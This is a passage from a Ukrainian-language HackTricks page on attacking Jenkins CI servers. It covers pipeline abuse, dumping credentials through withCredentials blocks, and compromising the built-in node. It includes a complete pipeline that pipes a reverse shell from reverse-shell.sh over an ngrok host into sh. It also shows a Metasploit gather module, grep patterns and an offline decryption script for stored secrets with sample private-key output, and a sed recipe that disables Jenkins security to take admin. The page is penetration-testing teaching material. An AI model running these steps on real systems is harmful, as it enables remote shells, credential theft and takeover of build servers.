—Ü–µ**.
{% endhint %}

### Pipeline RCE

–£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ RCE –≤–∂–µ –±—É–ª–∞ –≤–∫–∞–∑–∞–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è [**–æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE, –º–æ–¥–∏—Ñ—ñ–∫—É—é—á–∏ pipeline**](./#rce-creating-modifying-pipeline).

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞

–ú–æ–∂–ª–∏–≤–æ –æ–≥–æ–ª–æ—Å–∏—Ç–∏ **–∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ** –¥–ª—è –≤—Å—å–æ–≥–æ pipeline –∞–±–æ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –µ—Ç–∞–ø—ñ–≤. –¶—ñ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **–Ω–µ –ø–æ–≤–∏–Ω–Ω—ñ –º—ñ—Å—Ç–∏—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**, –∞–ª–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–∞–≤–∂–¥–∏ –º–æ–∂–µ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤—Å—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó pipeline/Jenkinsfiles:**
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### –í–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ç–µ, —è–∫ –∑–∞–∑–≤–∏—á–∞–π –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è —Å–µ–∫—Ä–µ—Ç–∏ –≤ Jenkins, –æ–∑–Ω–∞–π–æ–º—Ç–µ—Å—è –∑ –æ—Å–Ω–æ–≤–Ω–æ—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–æ–±–º–µ–∂–µ–Ω—ñ –≥–ª–æ–±–∞–ª—å–Ω–∏–º–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏** (`/credentials/`) –∞–±–æ **–∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º–∏ –ø—Ä–æ–µ–∫—Ç–∞–º–∏** (`/job/<project-name>/configure`). –¢–æ–º—É, —â–æ–± –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –≤—Å—ñ –∑ –Ω–∏—Ö, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–ª–∞–º–∞—Ç–∏ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –≤—Å—ñ –ø—Ä–æ–µ–∫—Ç–∏**, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å —Å–µ–∫—Ä–µ—Ç–∏, —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ/–æ—Ç—Ä—É—î–Ω—ñ –∫–æ–Ω–≤–µ—î—Ä–∏.

–Ñ —â–µ –æ–¥–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞: —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **—Å–µ–∫—Ä–µ—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ env** –∫–æ–Ω–≤–µ—î—Ä–∞, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–Ω–∞—Ç–∏ —ñ–º'—è —Ç–∞ —Ç–∏–ø —Å–µ–∫—Ä–µ—Ç—É**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** **—Å–µ–∫—Ä–µ—Ç** **`usernamePassword`** —è–∫ **—Å–µ–∫—Ä–µ—Ç** **`string`**, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ —Ü—é **–ø–æ–º–∏–ª–∫—É**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
–û—Å—å —è–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥–µ—è–∫—ñ –∑–∞–≥–∞–ª—å–Ω—ñ —Ç–∏–ø–∏ —Å–µ–∫—Ä–µ—Ç—ñ–≤:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
–í –∫—ñ–Ω—Ü—ñ —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–Ω–∞–π—Ç–∏ –≤—Å—ñ —Ç–∏–ø–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
–ù–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± **–≤–∏–≤–µ—Å—Ç–∏ –≤—Å—ñ —Å–µ–∫—Ä–µ—Ç–∏ –æ–¥—Ä–∞–∑—É** - —Ü–µ **–∑–ª–∞–º–∞—Ç–∏** –º–∞—à–∏–Ω—É **Jenkins** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª —É **–≤–±—É–¥–æ–≤–∞–Ω–æ–º—É –≤—É–∑–ª—ñ**) —ñ –ø–æ—Ç—ñ–º **–≤–∏–∫—Ä–∏—Ç–∏** **–º–∞–π—Å—Ç–µ—Ä-–∫–ª—é—á—ñ** —Ç–∞ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Å–µ–∫—Ä–µ—Ç–∏** —ñ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —ó—Ö –æ—Ñ–ª–∞–π–Ω.\
–ë—ñ–ª—å—à–µ –ø—Ä–æ —Ç–µ, —è–∫ —Ü–µ –∑—Ä–æ–±–∏—Ç–∏, —É —Ä–æ–∑–¥—ñ–ª—ñ [Nodes & Agents](./#nodes-and-agents) —Ç–∞ –≤ —Ä–æ–∑–¥—ñ–ª—ñ [Post Exploitation](./#post-exploitation).
{% endhint %}

### –¢—Ä–∏–≥–µ—Ä–∏

–ó [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): –î–∏—Ä–µ–∫—Ç–∏–≤–∞ `triggers` –≤–∏–∑–Ω–∞—á–∞—î **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —Å–ø–æ—Å–æ–±–∏, —è–∫–∏–º–∏ Pipeline –º–∞—î –±—É—Ç–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ –∑–∞–ø—É—â–µ–Ω–∏–π**. –î–ª—è Pipeline, —è–∫—ñ —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω—ñ –∑ –¥–∂–µ—Ä–µ–ª–æ–º, —Ç–∞–∫–∏–º —è–∫ GitHub –∞–±–æ BitBucket, `triggers` –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–µ–ø–æ—Ç—Ä—ñ–±–Ω—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ –≤–µ–±—Ö—É–∫—ñ–≤, –π–º–æ–≤—ñ—Ä–Ω–æ, –≤–∂–µ –ø—Ä–∏—Å—É—Ç–Ω—è. –î–æ—Å—Ç—É–ø–Ω—ñ —Ç—Ä–∏–≥–µ—Ä–∏: `cron`, `pollSCM` —Ç–∞ `upstream`.

–ü—Ä–∏–∫–ª–∞–¥ cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **—ñ–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó**.

### –í—É–∑–ª–∏ —Ç–∞ –ê–≥–µ–Ω—Ç–∏

**–ï–∫–∑–µ–º–ø–ª—è—Ä Jenkins** –º–æ–∂–µ –º–∞—Ç–∏ **—Ä—ñ–∑–Ω—ñ –∞–≥–µ–Ω—Ç–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ —Ä—ñ–∑–Ω–∏—Ö –º–∞—à–∏–Ω–∞—Ö**. –ó —Ç–æ—á–∫–∏ –∑–æ—Ä—É –∞—Ç–∞–∫—É—é—á–æ–≥–æ, –¥–æ—Å—Ç—É–ø –¥–æ —Ä—ñ–∑–Ω–∏—Ö –º–∞—à–∏–Ω –æ–∑–Ω–∞—á–∞—î **—Ä—ñ–∑–Ω—ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ö–º–∞—Ä–∏** –¥–ª—è –∫—Ä–∞–¥—ñ–∂–∫–∏ –∞–±–æ **—Ä—ñ–∑–Ω–∏–π –º–µ—Ä–µ–∂–µ–≤–∏–π –¥–æ—Å—Ç—É–ø**, —è–∫–∏–π –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —ñ–Ω—à–∏—Ö –º–∞—à–∏–Ω.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Å–Ω–æ–≤–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ **—Å–∫–æ–Ω—Ñ—ñ–≥—É—Ä–æ–≤–∞–Ω—ñ –≤—É–∑–ª–∏** –≤ `/computer/`, –∑–∞–∑–≤–∏—á–∞–π –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **`–í–±—É–¥–æ–≤–∞–Ω–∏–π –í—É–∑–æ–ª`** (—è–∫–∏–π —î –≤—É–∑–ª–æ–º, —â–æ –∑–∞–ø—É—Å–∫–∞—î Jenkins) —ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –±—ñ–ª—å—à–µ:

![](<../../.gitbook/assets/image (249).png>)

–¶–µ **–æ—Å–æ–±–ª–∏–≤–æ —Ü—ñ–∫–∞–≤–æ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –í–±—É–¥–æ–≤–∞–Ω–∏–π –≤—É–∑–æ–ª**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –º—ñ—Å—Ç–∏—Ç—å —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é Jenkins.

–©–æ–± –≤–∫–∞–∑–∞—Ç–∏, —â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏** **–∫–æ–Ω–≤–µ—î—Ä** —É **–≤–±—É–¥–æ–≤–∞–Ω–æ–º—É –≤—É–∑–ª—ñ Jenkins**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –≤ –∫–æ–Ω–≤–µ—î—Ä—ñ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é:
```bash
pipeline {
agent {label 'built-in'}
```
### –ü–æ–≤–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥

Pipeline –≤ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –∞–≥–µ–Ω—Ç—ñ, –∑ —Ç—Ä–∏–≥–µ—Ä–æ–º cron, –∑ –∑–º—ñ–Ω–Ω–∏–º–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ pipeline —Ç–∞ stage, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ 2 –∑–º—ñ–Ω–Ω—ñ –≤ –∫—Ä–æ—Ü—ñ —Ç–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—á–∏ –∑–≤–æ—Ä–æ—Ç–Ω–∏–π shell:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## –ü–æ—Å—Ç–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏, –æ—Ç—Ä–∏–º–∞–≤—à–∏ –¥–æ—Å—Ç—É–ø –¥–æ `/credentials/`, —è–∫—â–æ —É –≤–∞—Å –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ –ª–∏—à–µ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—î —Å–µ–∫—Ä–µ—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É `credentials.xml`, –∞–ª–µ **—Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑–±—ñ—Ä–∫–∏** —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ **–¥–æ–¥–∞—Ç–∫–æ–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**.

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–±–∞—á–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∫–æ–∂–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É**, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ç–∞–º **—ñ–º–µ–Ω–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö (—Å–µ–∫—Ä–µ—Ç—ñ–≤)**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é —Ç–∞ **—ñ–Ω—à–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –ø—Ä–æ–µ–∫—Ç—É**.

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

–¶—ñ —Ñ–∞–π–ª–∏ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–ª—è **–¥–µ—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

–¢–∞–∫—ñ **—Å–µ–∫—Ä–µ—Ç–∏ –∑–∞–∑–≤–∏—á–∞–π –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

–û—Å—å —Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑, —â–æ–± —ó—Ö –∑–Ω–∞–π—Ç–∏:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### –î–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ Jenkins –æ—Ñ–ª–∞–π–Ω

–Ø–∫—â–æ –≤–∏ —Å–∫–∏–Ω—É–ª–∏ **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –ø–∞—Ä–æ–ª—ñ –¥–ª—è –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**—Ü–µ–π —Å–∫—Ä–∏–ø—Ç**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **–¥–ª—è –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è —Ü–∏—Ö —Å–µ–∫—Ä–µ—Ç—ñ–≤**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### –î–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ Jenkins –∑ Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### –°—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞

1. –î–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—É Jenkins config.xml —É `/var/lib/jenkins/config.xml` –∞–±–æ `C:\Program Files (x86)\Jenkins\`
2. –ó–Ω–∞–π–¥—ñ—Ç—å —Å–ª–æ–≤–æ `<useSecurity>true</useSecurity>` —ñ –∑–º—ñ–Ω—ñ—Ç—å —Å–ª–æ–≤–æ **`true`** –Ω–∞ **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **–ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç—ñ—Ç—å** —Å–µ—Ä–≤–µ—Ä **Jenkins**: `service jenkins restart`
4. –¢–µ–ø–µ—Ä –∑–Ω–æ–≤—É –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –ø–æ—Ä—Ç–∞–ª—É Jenkins, —ñ **Jenkins –Ω–µ –∑–∞–ø–∏—Ç–∞—î –∂–æ–¥–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö** —Ü—å–æ–≥–æ —Ä–∞–∑—É. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ "**–£–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è Jenkins**", —â–æ–± –∑–Ω–æ–≤—É –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ **–ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞**.
5. **–£–≤—ñ–º–∫–Ω—ñ—Ç—å** **–±–µ–∑–ø–µ–∫—É** –∑–Ω–æ–≤—É, –∑–º—ñ–Ω–∏–≤—à–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ `<useSecurity>true</useSecurity>` —ñ **–∑–Ω–æ–≤—É –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç—ñ—Ç—å Jenkins**.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
